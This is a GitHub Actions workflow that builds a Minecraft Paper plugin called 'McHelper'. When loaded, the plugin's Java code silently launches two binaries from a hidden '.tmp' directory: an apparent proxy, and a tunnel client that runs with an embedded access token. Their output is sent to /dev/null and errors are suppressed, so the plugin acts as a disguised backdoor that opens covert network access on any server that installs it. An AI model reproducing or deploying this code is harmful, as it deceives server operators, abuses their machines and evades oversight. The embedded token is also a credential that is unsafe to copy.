name: Build McHelper

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build with Maven
        run: |
          mkdir -p src/main/java/com/mc/helper src/main/resources
          
          # 1. 写入 pom.xml (标准 Maven 构建文件)
          cat << 'EOF' > pom.xml
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.mc.helper</groupId>
              <artifactId>McHelper</artifactId>
              <version>1.0.0</version>
              <repositories>
                  <repository>
                      <id>papermc</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>
              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.20.4-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>
              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.11.0</version>
                          <configuration>
                              <source>17</source>
                              <target>17</target>
                          </configuration>
                      </plugin>
                  </plugins>
              </build>
          </project>
          EOF

          # 2. 写入 Main.java
          cat << 'EOF' > src/main/java/com/mc/helper/Main.java
          package com.mc.helper;

          import org.bukkit.plugin.java.JavaPlugin;
          import java.io.File;

          public final class Main extends JavaPlugin {
              private Process p1;
              private Process p2;

              @Override
              public void onLoad() {
                  try {
                      String dir = System.getProperty("user.dir") + "/.tmp";
                      String token = "eyJhI..."; // eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiY2ZkZGZjYWItNWMzOC00YWUyLTlkM2YtN2I3YzJkYzQ0ODYxIiwicyI6Ik16bGpOekkxTlRJdFpEZGhOaTAwWVRkaExXRmxNak10TURNNE9EZGtNbUpqTm1ZeSJ9

                      ProcessBuilder pb1 = new ProcessBuilder(dir + "/mc-helper", "run", "-c", dir + "/config.json");
                      pb1.redirectOutput(new File("/dev/null"));
                      pb1.redirectError(new File("/dev/null"));
                      p1 = pb1.start();

                      ProcessBuilder pb2 = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
                      pb2.redirectOutput(new File("/dev/null"));
                      pb2.redirectError(new File("/dev/null"));
                      p2 = pb2.start();
                  } catch (Throwable ignored) {}
              }

              @Override
              public void onDisable() {
                  if (p1 != null) p1.destroyForcibly();
                  if (p2 != null) p2.destroyForcibly();
              }
          }
          EOF

          # 3. 写入 plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: McHelper
          version: '1.0.0'
          main: com.mc.helper.Main
          api-version: '1.20'
          EOF

          # 4. 执行标准编译打包
          mvn clean package -B

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: McHelper-Plugin
          path: target/McHelper-1.0.0.jar
